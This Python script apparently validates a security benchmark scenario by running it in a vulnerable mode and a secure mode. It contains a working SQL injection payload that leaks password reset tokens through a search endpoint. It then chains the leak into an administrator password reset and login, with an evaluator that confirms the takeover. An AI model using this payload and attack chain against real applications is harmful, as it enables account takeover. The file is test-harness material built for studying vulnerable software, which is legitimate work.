from __future__ import annotations

import hashlib
import json
from pathlib import Path
from uuid import uuid4

import httpx

from check_stage3a_support_role_csrf_pair import (
    ADMIN_ID,
    EVENT_SCHEMA_PATH,
    PUBLIC_ORIGIN,
    bearer,
    canonical_json,
    compose_exec,
    configure_api,
    digest,
    digest_bytes,
    reset,
    running_image_digest,
)


PAYLOAD = (
    "x%') OR 1=0) UNION ALL SELECT pr.id,'password_reset',mo.recipient,mo.secret_value "
    "FROM mail_outbox mo JOIN users u ON u.email=mo.recipient JOIN password_resets pr "
    "ON pr.user_id=u.id WHERE mo.kind='password_reset' -- "
)
REPLACEMENT_PASSWORD = "RUBY-Replaced-Administrator-2026!"


def verifier() -> tuple[str, dict[str, object]]:
    scenario_id = "multi-stage-search-leak-session-takeover"
    predicate_id = scenario_id + ".effect"
    subject = {"actor_id": "anonymous", "authorized": "false", "role": "guest"}
    object_ = {"resource_id": ADMIN_ID, "target_role": "admin"}
    deduplication_key = f"search-reset-takeover:{ADMIN_ID}"
    condition = {
        "deduplication_key": deduplication_key,
        "event_type": "account.taken_over",
        "minimum_occurrences": 1,
        "object": object_,
        "protected_resource_key": "admin.account",
        "subject": subject,
        "window_seconds": 300,
    }
    return predicate_id, {
        "contract_version": 1,
        "scenario_id": scenario_id,
        "verifier_image_digest": running_image_digest("evaluator"),
        "event_schema_digest": digest_bytes(EVENT_SCHEMA_PATH.read_bytes()),
        "network_access": "control-only",
        "attacker_visible": False,
        "predicates": [{
            "predicate_id": predicate_id,
            "effect_type": "administrator-access",
            "event_type": "account.taken_over",
            "subject_selector": canonical_json(subject),
            "object_selector": canonical_json(object_),
            "protected_resource_key": "admin.account",
            "condition_digest": digest(condition),
            "window_seconds": 300,
            "minimum_occurrences": 1,
            "deduplication_key": deduplication_key,
        }],
    }


def evaluate(trial_id: str, predicate_id: str, manifest: dict[str, object]) -> dict[str, object]:
    payload = canonical_json({"trial_id": trial_id, "predicate_id": predicate_id, "verifier": manifest})
    code = (
        "import os,sys,urllib.request;"
        "r=urllib.request.Request('http://127.0.0.1:8000/internal/evaluate',"
        "data=sys.argv[1].encode(),headers={'Content-Type':'application/json',"
        "'X-Ruby-Evaluator-Token':os.environ['RUBY_EVALUATOR_TOKEN']});"
        "print(urllib.request.urlopen(r).read().decode())"
    )
    return json.loads(compose_exec("evaluator", code, payload))


def run_condition(vulnerable: bool) -> dict[str, object]:
    module = "multi-stage.search-leak-session-takeover"
    trial_id = uuid4().hex
    configure_api(trial_id=trial_id, module_id=module if vulnerable else None)
    reset()
    with httpx.Client(base_url=PUBLIC_ORIGIN, timeout=20) as client:
        control = client.get("/api/search", params={"q": "camera"})
        control.raise_for_status()
        requested = client.post(
            "/api/auth/password-reset/request",
            json={"email": "admin@ruby.local"},
        )
        requested.raise_for_status()
        searched = client.get("/api/search", params={"q": PAYLOAD})
        searched.raise_for_status()
        reset_rows = [item for item in searched.json() if item["kind"] == "password_reset"]
        leaked_token = reset_rows[0]["summary"] if len(reset_rows) == 1 else None
        confirmation_status = None
        if leaked_token is not None:
            confirmation = client.post(
                "/api/auth/password-reset/confirm",
                json={"token": leaked_token, "new_password": REPLACEMENT_PASSWORD},
            )
            confirmation_status = confirmation.status_code
        replacement_login = client.post(
            "/api/auth/login",
            json={"email": "admin@ruby.local", "password": REPLACEMENT_PASSWORD},
        )
    predicate_id, manifest = verifier()
    evaluation = evaluate(trial_id, predicate_id, manifest)
    checks = {
        "normal_search_control_succeeded": control.status_code == 200
        and any(item["id"] == "ruby-camera" for item in control.json()),
        "reset_request_was_generic": requested.json() == {"status": "accepted"},
        "reset_token_row_matches_condition": len(reset_rows) == (1 if vulnerable else 0),
        "confirmation_matches_condition": confirmation_status == (204 if vulnerable else None),
        "administrator_login_matches_condition": (replacement_login.status_code == 200) is vulnerable,
        "private_evaluator_matches_condition": evaluation["objective_achieved"] is vulnerable,
        "event_count_matches_condition": len(evaluation["matched_event_ids"]) == (1 if vulnerable else 0),
    }
    return {
        "scenario_id": "search-leak-session-takeover",
        "condition": "vulnerable" if vulnerable else "secure",
        "trial_id": trial_id,
        "search_http_status": searched.status_code,
        "reset_token_rows": len(reset_rows),
        "leaked_token_sha256": (
            hashlib.sha256(leaked_token.encode()).hexdigest()
            if leaked_token is not None
            else None
        ),
        "confirmation_http_status": confirmation_status,
        "replacement_login_http_status": replacement_login.status_code,
        "evaluation": evaluation,
        "checks": checks,
        "passed": all(checks.values()),
    }


def main() -> int:
    parser = __import__("argparse").ArgumentParser()
    parser.add_argument("--output-dir", type=Path, required=True)
    args = parser.parse_args()
    if args.output_dir.exists():
        raise FileExistsError(f"refusing to overwrite output directory: {args.output_dir}")
    args.output_dir.mkdir(parents=True)
    report: dict[str, object]
    try:
        results = [run_condition(False), run_condition(True)]
        report = {
            "report_version": 1,
            "scenario_id": "search-leak-session-takeover",
            "module_id": "multi-stage.search-leak-session-takeover",
            "results": results,
            "passed": all(item["passed"] for item in results),
        }
    finally:
        configure_api(trial_id=None, module_id=None)
        reset()
    report_path = args.output_dir / "stage3a-search-takeover-pair-report.json"
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    print(json.dumps({"report": str(report_path), "passed": report["passed"]}, sort_keys=True))
    return 0 if report["passed"] else 2


if __name__ == "__main__":
    raise SystemExit(main())
